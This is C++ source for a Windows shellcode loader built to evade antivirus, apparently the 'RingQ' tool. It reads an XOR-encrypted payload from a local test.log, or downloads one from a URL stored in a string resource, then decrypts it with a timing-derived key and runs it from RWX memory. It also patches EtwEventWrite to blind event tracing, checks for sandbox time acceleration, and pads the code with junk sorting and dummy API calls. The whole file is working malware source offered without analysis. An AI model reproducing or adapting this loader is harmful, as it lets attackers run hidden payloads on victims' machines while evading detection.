#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <numeric>
#include <functional>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <sstream>

using namespace std;

void bubble(int arr[], int n) {
    for (int i = 0; i < n - 1; i++) {
        for (int j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                int k = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = k;
            }
        }
    }
}

void generateAndSortArray() {
    std::srand(std::time(0));

    const int ARRAY_SIZE = 100;
    int huaarr[ARRAY_SIZE];
    for (int i = 0; i < ARRAY_SIZE; i++) {
        huaarr[i] = std::rand() % 1000;
    }

    bubble(huaarr, ARRAY_SIZE);

    for (int i = 0; i < ARRAY_SIZE; i++) {
    }
}

void targetFunction() {
    unsigned __int64 i = 0;

    __try {
        i = MessageBoxA(NULL, NULL, NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    i = GetLastError();

    __try {
        i = SetCriticalSectionSpinCount(NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    i = GetWindowContextHelpId(NULL);

    __try {
        i = GetWindowLongPtrW(NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    __try {
        i = RegisterClassW(NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    i = IsWindowVisible(NULL);

    __try {
        i = ConvertDefaultLocale(NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    __try {
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }

    __try {
        i = IsDialogMessageW(NULL, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {

    }
}

int obfuscate(int value) {
    const int secret = 42;
    return (value ^ secret) + secret;
}

void obfuscatedLogic() {
    std::string test1 = "Xe59NNNNWQ935bs8eCPKN4fjkK2ejcM3XDa8tiJ5e35WmYwFBjwReAn0yTWS9dtwT50Wabz87QnRRn0kEriNKYcYJKcBsAs5DK33k1Wmz2HwXjYz6ctb8f2G";
    std::string test2 = "rSzmfGz9Wtn58JDM0atCEMP0ffJ6jzycdXsT8w0RkwGwMxYaWxKak81cd62KeSpWK7XatfadREKBi6zTHHx5jw95mD000BXhFEABQCm2EXT7cwzCzJeMrdkH";
    std::string test3 = "pC64zZ013KbXS6hrZPJaXfjnd2prp5yc5rrYwF209Sb1Y0SW3bPGN7tWfJnb0DRYN7G9DpWryzMiBimQy1T4B6BfCeyj9b09arPZ6JbsT6R50AtDhSZ3wNWM";
    std::string test4 = "AABJ9kpmBppfNYmh6F0zM5BsnMD2jz4GQQT2b8PZPBY5ch1Xp1HH3XMkZsnQT8rPG6D92WhhjNpM7JipTN7tWm3C0W8RPMAHmXy8Yx9aB5H0h6P1S0i59GY9";
    std::string test5 = "https://www.google.com/";
    std::string test6 = "https://www.amazon.com/";

    std::vector<int> numbers = { 1, 2, 3, 4, 5 };

    std::transform(numbers.begin(), numbers.end(), numbers.begin(), obfuscate);

    int sum = std::accumulate(numbers.begin(), numbers.end(), 0);

    const int magicNumber = 13;
    if (sum % magicNumber == 0) {
        void (*functionPtr)() = targetFunction;
        functionPtr();
    }
}

std::string xorDecrypt(const std::string& data, const std::string& key) {
    std::string decryptedData;
    for (std::size_t i = 0; i < data.length(); ++i) {
        decryptedData += data[i] ^ key[i % key.length()];
    }
    return decryptedData;
}

void quick(int arr[], int left, int right) {
    int i = left, j = right;
    int tmp;
    int pivot = arr[(left + right) / 2];

    while (i <= j) {
        while (arr[i] < pivot)
            i++;
        while (arr[j] > pivot)
            j--;
        if (i <= j) {
            tmp = arr[i];
            arr[i] = arr[j];
            arr[j] = tmp;
            i++;
            j--;
        }
    }

    if (left < j)
        quick(arr, left, j);
    if (i < right)
        quick(arr, i, right);
}

int decryptKey(int diff, int minValue, int maxValue) {
    for (int num = minValue; num <= maxValue; num++) {
        generateAndSortArray();

        int randomValue = diff + num;

        if (520519 < randomValue && randomValue < 520521) {
            return randomValue;
        }
    }
}

BOOL DisableEvent(void) {
    DWORD oldprotect = 0;

    char eventwrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
    char dll[] = { 'n','t','d','l','l', 0 };
    char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };

    void* addr = GetProcAddress(GetModuleHandleA(dll), eventwrite);
    if (!addr) {
        return FALSE;
    }
    BOOL status = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
    if (!status) {
        return FALSE;
    }

    memcpy(addr, patch, sizeof(patch));

    BOOL statusvir = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
    if (!statusvir) {
        return FALSE;
    }

    return TRUE;
}

std::wstring GetStringTableValue(int resourceId) {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    const int bufferSize = 256;
    TCHAR buffer[bufferSize];

    if (LoadString(hInstance, resourceId, buffer, bufferSize) > 0) {
        std::wstring strValue(buffer);
        return strValue;
    }
    else {
        return L"";
    }
}

bool isTimeAccelerated() {
    auto start = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto end = std::chrono::steady_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    return duration.count() < 5000;
}

std::string wstringToString(const std::wstring& wstr) {
    std::string str(wstr.begin(), wstr.end());
    return str;
}

bool isFileExists(const std::string& file_path) {
    std::ifstream file(file_path);
    return file.good();
}

std::string getExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    std::string::size_type pos = std::string(buffer).find_last_of("\\/");
    return std::string(buffer).substr(0, pos);
}

void RingQ(const std::string& file_path) {
    std::ifstream input_file(file_path, std::ios::binary);
    if (!input_file) {
        std::cout << "Failed to open file!" << std::endl;
        return;
    }

    std::string encrypted_data((std::istreambuf_iterator<char>(input_file)), std::istreambuf_iterator<char>());
    input_file.close();

    auto start_time = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    auto end_time = std::chrono::high_resolution_clock::now();

    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
    int time_diff = elapsed_time.count();

    int demo = 520521;
    int diff = demo - time_diff;


    int i = 300;
    while (i--) {
        int randomValue = decryptKey(diff, 1900, 2200);

        if (520519 < randomValue && randomValue < 520521) {

            std::string randomkey = std::to_string(randomValue);

            std::string decrypted_data = xorDecrypt(encrypted_data, randomkey);
            const unsigned char* byte_sequence = reinterpret_cast<const unsigned char*>(decrypted_data.c_str());
            size_t byte_sequence_length = decrypted_data.length();

            LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            generateAndSortArray();

            memcpy(execMemory, byte_sequence, byte_sequence_length);


            typedef void (*ShellcodeFunc)();

            generateAndSortArray();

            ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

            generateAndSortArray();

            shellcodeFunc();

            VirtualFree(execMemory, 0, MEM_RELEASE);


        }break;

    }
}

void downloadFile(const std::string& url, const std::string& filename) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;

    hInternet = InternetOpen(L"File Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpen failed" << std::endl;
        return;
    }

    hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "InternetOpenUrlA failed" << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open file for writing" << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    char buffer[4096];
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        file.write(buffer, bytesRead);
    }

    file.close();
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    generateAndSortArray();

    std::string executablePath = getExecutablePath();
    std::string file_path = executablePath + "\\test.log";

    if (isFileExists(file_path)) {
        cout << "Loading Dir  ..." << endl;
        RingQ(file_path);
        return 0;
    }
    else {
        int resourceId = 101;
        std::wstring myVariable = GetStringTableValue(resourceId);
        std::string file_path_absolute = wstringToString(myVariable);
        std::cout << file_path_absolute << std::endl;

        if (!file_path_absolute.empty()) {
            if (file_path_absolute.substr(0, 4) == "http") {
                cout << "Loading StringTable ..." << endl;
                generateAndSortArray();
                const string filename = "test.log";
                downloadFile(file_path_absolute, filename);
                RingQ(filename);
            }
            else {
                cout << "Loading LocalFile ..." << endl;
                generateAndSortArray();
                cout << file_path_absolute << std::endl;
                RingQ(file_path_absolute);
            }
        }
        else {
            if (isTimeAccelerated()) {
                if (!DisableEvent()) {
                    return -3;
                }

                cout << "No Find ..or StringTable ..." << endl;
                std::cout << "\n";
                for (int i = 1; i <= 9; ++i) {
                    generateAndSortArray();
                    for (int j = 1; j <= i; ++j) {
                        generateAndSortArray();
                        std::cout << j << " x " << i << " = " << (i * j);
                        if (j < i) {
                            generateAndSortArray();
                            std::cout << "\t";
                        }
                    }
                    std::cout << std::endl;
                }
            }
            return 0;
        }
    }
}
